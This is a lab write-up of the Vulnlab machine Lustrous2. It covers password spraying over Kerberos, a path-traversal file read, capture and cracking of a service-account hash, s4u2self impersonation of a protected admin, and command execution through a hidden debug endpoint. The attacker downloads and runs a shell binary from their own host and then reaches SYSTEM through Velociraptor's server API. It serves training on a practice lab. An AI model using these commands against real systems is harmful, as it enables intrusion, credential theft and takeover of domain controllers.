---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2024-09-22-vl-lustrous2
tags:
- active directory
- kerberos
title: VL Lustrous2
---

Lustrous2 is a hardened AD Environment on [Vulnlab](https://vulnlab.com) that involves dealing with LDAP signing, channel binding and disabled NTLM authentication. We'll impersonate a protected user against a web application via `s4u2self` and then escalate privileges in an insecure [Velociraptor](https://github.com/Velocidex/velociraptor) installation.
  
## Enumeration

First we scan the machine on the most common tcp ports:

```terminal
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5357/tcp open  wsdapi 
```

Note that we are dealing with a domain controller. Let's check the ftp share (login with `ftp:ftp`):

```terminal
ftp lustrous2.vl
Connected to lus2dc.lustrous2.vl.
220 Microsoft FTP Service
Name (lustrous2.vl:xct): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58719|)
125 Data connection already open; Transfer starting.
09-06-24  05:20AM       <DIR>          Development
09-07-24  12:03AM       <DIR>          Homes
08-31-24  01:57AM       <DIR>          HR
08-31-24  01:57AM       <DIR>          IT
09-09-24  10:25AM       <DIR>          ITSEC
08-31-24  01:58AM       <DIR>          Production
08-31-24  01:58AM       <DIR>          SEC
226 Transfer complete.
ftp> ls homes
229 Entering Extended Passive Mode (|||58721|)
125 Data connection already open; Transfer starting.
09-07-24  12:03AM       <DIR>          Aaron.Norman
09-07-24  12:03AM       <DIR>          Adam.Barnes
...
09-07-24  12:03AM       <DIR>          Victoria.Williams
09-07-24  12:03AM       <DIR>          Wayne.Taylor
226 Transfer complete.
ftp>
```

A couple of folders are readable and we can also access the homes directory. While we can not enter any of these directories due to missing permissions, we can get a list of usernames. We grab the names and collect them in a clean users.txt file, then spray some passwords that fit the labs name or are in general more likely (any of these will yield a result here: `Lustrous2!, Lustrous2024, Start123!, Sommer2024`).

However when we try to do this, we get the following error for all users:

```terminal
nxc ldap lustrous2.vl -u users.txt -p 'Lustrous2024'
LDAP        10.10.105.184   389    LUS2DC.Lustrous2.vl [*]  x64 (name:LUS2DC.Lustrous2.vl) (domain:Lustrous2.vl) (signing:True) (SMBv1:False)
LDAP        10.10.105.184   389    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Aaron.Norman:Lustrous2024 STATUS_NOT_SUPPORTED
LDAP        10.10.105.184   389    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Adam.Barnes:Lustrous2024 STATUS_NOT_SUPPORTED
```

This suggests that NTLM is disabled and authentication is only possible via kerberos. We can spray using nxc and kerberos by adding the `-k` flag as follows:

```terminal
nxc ldap lustrous2.vl -u users.txt -p 'Lustrous2024' -k
LDAP        lustrous2.vl    389    LUS2DC.Lustrous2.vl [*]  x64 (name:LUS2DC.Lustrous2.vl) (domain:Lustrous2.vl) (signing:True) (SMBv1:False)
LDAP        lustrous2.vl    389    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Aaron.Norman:Lustrous2024 KDC_ERR_PREAUTH_FAILED
...
LDAP        lustrous2.vl    389    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Terence.Jordan:Lustrous2024 KDC_ERR_PREAUTH_FAILED
LDAPS       lustrous2.vl    636    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Thomas.Myers:Lustrous2024
LDAP        lustrous2.vl    389    LUS2DC.Lustrous2.vl [-] Lustrous2.vl\Tony.Davies:Lustrous2024 KDC_ERR_PREAUTH_FAILED
```

This results in one user having a different error message for `Thomas Myers` - let's attempt to get a TGT for this one:

```terminal
getTGT.py lustrous2.vl/thomas.myers:'Lustrous2024' -dc-ip lustrous2.vl
[*] Saving ticket in thomas.myers.ccache

export KRB5CCNAME=thomas.myers.ccache
```

Since nxc can't really gather bloodhound data in this scenario at the time of writing, we use ldapsearch to gather the data that we need for bloodhound:

```terminal
ldapsearch -LLL -H ldap://lus2dc.lustrous2.vl -Y GSSAPI -b "DC=LUSTROUS2,DC=VL" -N -o ldif-wrap=no -E '!1.2.840.113556.1.4.801=::MAMCAQc=' "(&(objectClass=*))" | tee ldap.txt
```

We can convert this data to the bloodhound format using [bofhound](https://github.com/coffeegist/bofhound). In order to do this, we have to fix the format a bit first though. We are going to do this with this [script](https://gist.github.com/kozmer/725cde788e4b3c8bdd870468c243916b) from [kozmer](https://x.com/k0zmer):

```terminal
python3 ldapsearch_parser.py ldap.txt ldap2.txt

pipx install bofhound
bofhound --input ldap2.txt --output /tmp/bh --zip
...
[14:30:43] INFO     Files compressed into /tmp/bh/bloodhound_20240922_143043.zip
```

This zip can now be loaded in bloodhound. There are however no AD misconfigurations that help us proceed. The port scan also showed port 80, so let's try to go to the website:

```terminal
curl http://lus2dc.lustrous2.vl -I
HTTP/1.1 401 Unauthorized
Transfer-Encoding: chunked
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
X-Powered-By: ASP.NET
Date: Sun, 22 Sep 2024 12:33:24 GMT
```

This shows that the website needs authentication. Let's try to authenticate using kerberos:

```terminal
curl --negotiate -u : http://lus2dc.lustrous2.vl -I
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv1/81cd0bzYdSue5HDXFhXap7xXYwIZQVZ1B3245USLvQU4Lpip38FLZodEdUjXY+R1Lp+IyGVeRJ/acD8880oot6nAAuJmoDCMT4xqyhhJr9YL+iQAcVCjJS9/KXROcTd+GFubg6nLkht4UKoGvU
Persistent-Auth: true
X-Powered-By: ASP.NET
Date: Sun, 22 Sep 2024 12:34:07 GMT
```

This works!


## Exploring the web app

We browse to the site in firefox (please check the last section for notes on how to make sure this works):

![lushare](lushare.png)

This is a file sharing web application. While we can download the file, nothing special is in it. When we do so, we can see the following request:

```terminal
# request 
http://lus2dc.lustrous2.vl/File/Download?fileName=audit.txt
```

Let's check for local file inclusion (LFI):

```terminal
# request
http://lus2dc.lustrous2.vl/File/Download?fileName=..\..\..\..\windows\win.ini

# result
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

This indeed works to retrieve local files the user the web server is running as has access to. We however don't really know which files to read at this point. Since this is a windows machine, we can try to provide a UNC Path and see if the requests hits our own machine:

```terminal
# start smb server
sudo smbserver.py share share -smb2support

# request unc path
http://lus2dc.lustrous2.vl/File/Download?fileName=\\10.8.0.101\share\file.txt

# capture hash
[*] Incoming connection (10.10.105.184,60396)
[*] AUTHENTICATE_MESSAGE (LUSTROUS2\ShareSvc,LUS2DC)
[*] User LUS2DC\ShareSvc authenticated successfully
[*] ShareSvc::LUSTROUS2:aaaaaaaaaaaaaaaa:****475c71e4c521f1be5437e372e6aa:0101000000000000000b5ceff10cdb01dbee5b01128697c10000000001001000660075006a004c005500710053006a0003001000660075006a004c005500710053006a00020010004100530052006a00670046004b005a00040010004100530052006a00670046004b005a0007000800000b5ceff10cdb0106000400020000000800300030000000000000000000000000210000df5dc216b53fbf3432447325857e3f50bc34f11c3b05df412787003c9dfbda620a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0030002e003100300031000000000000000000
```

We can attempt to crack this hash using john:

```terminal
~/tools/john/run/john -w=$HOME/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
...
***        (ShareSvc)
```

Now that we have service password, we can attempt to impersonate a user against the web application.


## Impersonation via s4u2self

Checking AD groups in BH, we can see that there is a group called "ShareAdmins". It's safe to assume that these are the admins of this sharing web application. This group is however a member of the "Protected Users" Group, which means that those users cant "easily" be impersonated when using techniques like Silver Tickets or Delegation.

One technique that allows to bypass this restriction is `s4u2self`. Using the `s4u2self` kerberos extension, allows the service user to request a service ticket to itself on behalf of an abitrary principal.

In order to perform the attack, we grab the latest `getST.py`, get a TGT for the service user and then impersonate one of the share admins, here ryan:

```terminal
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/getST.py

getTGT.py lustrous2.vl/ShareSvc:'***' -dc-ip lustrous2.vl
export KRB5CCNAME=ShareSvc.ccache

python3 getST.py -self -impersonate "Ryan.Davies" -k -no-pass lustrous2.vl/ShareSvc -altservice HTTP/lus2dc.lustrous2.vl

[*] Impersonating Ryan.Davies
[*] Requesting S4U2self
[*] Changing service from ShareSvc@LUSTROUS2.VL to HTTP/lus2dc.lustrous2.vl@LUSTROUS2.VL
[*] Saving ticket in Ryan.Davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache

export KRB5CCNAME=Ryan.Davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache

curl --negotiate -u : http://lus2dc.lustrous2.vl -I
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRvoRXYTpELGkalRdzUYEoK0+B5rco4hT/Y8P9ub0aI+19K1JaP5DHMdrZxTWzRgUxQdgiL95tEph+X1IJ8qKGThhmzSvzlepoGVmHBs5TwiWw5JpVfSnpjuiZdDKoqwGHmRqaWwYI8699fovUpQ+PV
Persistent-Auth: true
X-Powered-By: ASP.NET
Date: Sun, 22 Sep 2024 13:34:44 GMT
```

Starting firefox again, we can see we are logged in as an application admin and have a new upload option. In addition there is a hidden debug endpoint we can see in the source:

![lushare](lushare_admin.png)

```html
<!--
  <li class="nav-item">
      <a class="nav-link" href="/File/Debug">Debug</a>
  </li>
-->
```

![lushare](lushare_admin_cmd.png)

## RCE via debug functionality

In order to run a command, we would however need a pin code. Usually such a secret would either be in web.config or in the source code of the application. Let's see if we can read web.config:

```terminal
# request
http://lus2dc.lustrous2.vl/File/Download?fileName=../../web.config

# response
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="dotnet" arguments=".\LuShare.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 4E46018E-B73C-4E7B-8DA2-87855F22435A-->
```

While this has no pin code, we see that this a .NET core application that is run from `LuShare.dll`. We use the LFI to grab the file from the same location as web.config and start to reverse it:

```terminal
# request
http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll
```

To decompile the .NET dll, we are using [CodemerxDecompile](https://github.com/codemerx/CodemerxDecompile) as this runs on linux and doesn't require VM switching.

![lushare](lushare_reverse.png)

Here we can see the value of required the pin code and also that the commands are actually powershell commands in a custom runspace that is length restricted and using constrained language mode. 

Let's confirm we can run commands by using curl:

```terminal
curl --negotiate -u : -X POST http://lus2dc.lustrous2.vl/File/Debug -d 'pin=***&command=whoami'

lustrous2\sharesvc
```

This confirms we do have RCE here. In order to get a shell, use your favorite av-evading shell binary, upload & run it.

```terminal
# upload
curl --negotiate -u : -X POST http://lus2dc.lustrous2.vl/File/Debug -d 'pin=***&command=iwr http://10.8.0.101:8000/share.exe -outfile c:\programdata\share.exe'

# run
curl --negotiate -u : -X POST http://lus2dc.lustrous2.vl/File/Debug -d 'pin=***&command=c:\programdata\share.exe'
```

## Escalating privileges using velociraptor 

Local enumeration shows, that this machine is both a Velociraptor server and client. Velociraptor is a tool for digital forensics & incident response that is primarily meant to give visibility into endpoints. The application can be found here:

```terminal
C:\Users\ShareSvc>dir "\Program Files"
 Volume in drive C is System
 Volume Serial Number is 58B1-CECF

 Directory of C:\Program Files

...
09/06/2024  08:35 AM    <DIR>          Velociraptor
09/06/2024  08:34 AM    <DIR>          VelociraptorServer
...
               0 File(s)              0 bytes
              17 Dir(s)   4,107,612,160 bytes free 
```

In the server directory, there is a `server.config.yaml` file which contains a certificate. This is default on Velociraptor installations - the [docs](https://docs.velociraptor.app/docs/deployment/security/) encourage you to delete those *security reasons* but it's not enforced:

```plaintext
In a secure installation you should remove the CA.private_key section from the server config and keep it offline. 
```

Using these certificates, it's possible to create an API key and then perform actions as administrator inside the application using the [server api](https://docs.velociraptor.app/docs/server_automation/server_api/).

```batch
C:\PROGRA~1\VelociraptorServer>velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrator c:\temp\api.config.yaml
```

Now we can run queries as administrator against the API, allowing us to use `execve` to run system commands:

```batch
C:\PROGRA~1\VelociraptorServer>velociraptor-v0.72.4-windows-amd64.exe --api_config c:\temp\api.config.yaml query "SELECT * FROM execve(argv=['cmd','/c','whoami'])
velociraptor-v0.72.4-windows-amd64.exe --api_config c:\temp\api.config.yaml query "SELECT * FROM execve(argv=['cmd','/c','whoami'])
[
 {
  "Stdout": "nt authority\\system\r\n",
  "Stderr": "",
  "ReturnCode": 0,
  "Complete": true
 }
]
```

## Additional Resources

- [s4u2self](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
- [velociraptor](https://github.com/Velocidex/velociraptor)

### Notes

In order to make kerberos authentication work from your non-domain joined linux machine, use the following krb5.conf (`apt install krb5-user`):

```plaintext
[libdefaults]
        default_realm = LUSTROUS2.VL
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true
        dns_canonicalize_hostname = false
        dns_lookup_realm = false
        dns_lookup_kdc = true
        k5login_authoritative = false
[realms]        
        LUSTROUS2.VL = {
                kdc = lustrous2.vl
                admin_server = lustrous2.vl
                default_admin = lustrous2.vl
        }
[domain_realm]
        .lustrous2.vl = LUSTROUS2.VL
```

Additionally, add the following line to `/etc/hosts`:

```plaintext
<ip> lus2dc.lustrous2.vl lustrous2.vl
```

In Firefox, make the following changes in `about:config`:

```plaintext
network.negotiate-auth.delegation-uris: lus2dc.lustrous2.vl
network.negotiate-auth.trusted-uris: lus2dc.lustrous2.vl
network.negotiate-auth.using-native-gsslib: true
```
